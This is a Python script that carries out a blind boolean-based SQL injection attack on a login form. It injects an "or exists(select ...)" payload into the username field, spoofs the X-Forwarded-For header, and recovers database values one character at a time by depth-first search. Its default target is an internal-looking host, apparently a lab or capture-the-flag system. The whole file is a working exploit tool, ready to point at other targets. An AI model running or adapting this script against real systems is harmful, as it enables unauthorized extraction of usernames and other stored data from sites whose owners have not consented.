#!/usr/bin/env python3
import argparse
import requests
import string


class BlindSQLiEnumerator:
    def __init__(self,
                 query_template,
                 charset=None,
                 target_url="http://wwwhost-new.powergrid.tcc:8000/app/login.php?lang=en",
                 success_indicator="User found"):
        """
        Initialize the generic SQL injection enumerator.

        Args:
            target_url (str): Target URL to send requests to
            query_template (str): SQL query template for matching (use {cond} placeholder)
            success_indicator (str): String in response that indicates successful query
            charset (str): Character set to use for enumeration (default: lowercase + underscore)
        """
        self.target_url = target_url
        self.query_template = query_template
        self.success_indicator = success_indicator
        self.session = requests.Session()

        # Character set: lowercase letters + underscore by default
        self.charset = charset or (string.ascii_lowercase + '_')

        # Found values
        self.found_values = set()

        # Request headers
        self.headers = {
            'X-Forwarded-For': '203.0.113.10'
        }

    def _send_payload(self, payload):
        try:
            data = {
                'username': payload,
                'password': 'idk'
            }

            response = self.session.post(
                self.target_url,
                data=data,
                headers=self.headers,
                timeout=10,
                allow_redirects=True
            )

            return self.success_indicator in response.text

        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")
            return False

    def _create_payload(self, value: str, is_exact: bool = False):
        """
        Create SQL injection payload to check if values with given prefix exist.

        Args:
            value (str): Value to check
            is_exact (bool): Whether to create payload for exact match
        Returns:
            str: SQL injection payload
        """
        # Escape single quotes and LIKE wildcards in value
        escaped_value = value.replace("'", "''")  # Escape single quotes

        if is_exact:
            formatted_query = self.query_template.format(
                cond=f"='{escaped_value}'")
        else:
            escaped_value = escaped_value.replace("_", "\\_")  # Escape underscore wildcard
            escaped_value = escaped_value.replace("%", "\\%")  # Escape percent wildcard
            formatted_query = self.query_template.format(
                cond=f" LIKE '{escaped_value}%'")

        payload = f"' or exists(select null from {formatted_query}) or '1'='2"

        return payload

    def _is_complete_value(self, prefix):
        return self._send_payload(self._create_payload(prefix, is_exact=True))

    def _enumerate_values_dfs(self, prefix="", max_depth=50):
        """
        Enumerate values using depth-first search.

        Args:
            prefix (str): Current prefix being explored
            max_depth (int): Maximum recursion depth to prevent infinite loops
        """
        if max_depth <= 0:
            print(f"[!] Maximum depth reached for prefix: {prefix}")
            return False

        # Check if current prefix matches any values
        if not self._send_payload(self._create_payload(prefix)):
            return False  # No values start with this prefix

        something_found = False
        # Check if this might be a complete value
        if len(prefix) > 0:
            if self._is_complete_value(prefix):
                print(f"[+] Found complete value: {prefix}")
                self.found_values.add(prefix)
                something_found = True
                # Don't return - there might be longer values with this prefix

        # Try extending the prefix with each character
        for char in self.charset:
            new_prefix = prefix + char
            # print(f"[*] Exploring prefix: {new_prefix}")
            something_found |= self._enumerate_values_dfs(new_prefix, max_depth - 1)

        if not something_found:
            print(f"[-] Prefix {prefix} matches but charset is insufficient to find complete value")
        return True

    def enumerate_values(self, max_value_length=50):
        print(f"[*] Starting blind SQL injection value enumeration")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Query template: {self.query_template}")
        print(f"[*] Success indicator: '{self.success_indicator}'")
        print(f"[*] Character set: {self.charset}")
        print("-" * 60)

        try:
            # Start DFS from empty prefix
            self._enumerate_values_dfs("", max_value_length)

        except KeyboardInterrupt:
            print("\n[!] Enumeration interrupted by user")

        print("-" * 60)
        print(f"[*] Enumeration complete!")

        return self.found_values


def main():
    parser = argparse.ArgumentParser(
        description='Blind SQL Injection Enumerator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    %(prog)s "users where username{cond}"
    %(prog)s "users where username{cond}" "abcdefghijklmnopqrstuvwxyz0123456789_"
        '''
    )

    parser.add_argument(
        'query_template',
        help='SQL query template with {cond} placeholder (e.g., "users where username{cond}")'
    )

    parser.add_argument(
        'charset',
        nargs='?',
        default=None,
        help='Character set for enumeration (default: lowercase letters + underscore)'
    )

    args = parser.parse_args()

    # Create enumerator instance
    enumerator = BlindSQLiEnumerator(
        query_template=args.query_template,
        charset=args.charset
    )

    # Run enumeration
    enumerator.enumerate_values()


if __name__ == "__main__":
    main()
